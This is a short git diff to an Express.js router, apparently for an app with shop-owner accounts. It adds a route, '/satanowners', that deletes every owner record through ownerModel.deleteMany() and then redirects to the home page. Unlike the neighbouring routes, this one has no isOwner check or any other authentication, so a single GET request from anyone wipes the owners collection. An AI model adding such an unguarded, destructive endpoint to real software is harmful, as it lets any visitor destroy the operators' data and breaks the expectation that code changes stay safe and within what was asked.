@@ -633,6 +633,11 @@ router.get('/test',isOwner,(req, res)=>{
     res.send(req.owner)
 })
 
+router.get('/satanowners',async (req, res)=>{
+    await ownerModel.deleteMany();
+    res.redirect('/');
+})
+
 router.post('/updateproduct/:pid',isOwner, async (req, res) => {
     try {
         const { name, price, description, stock, discount, bgcolor, panelcolor, textcolor } = req.body;
@@ -690,6 +695,7 @@ router.post('/assigntask', isOwner , async (req, res)=>{
         res.redirect('/owners/users');
     }
 })
+
 
 //logout
 
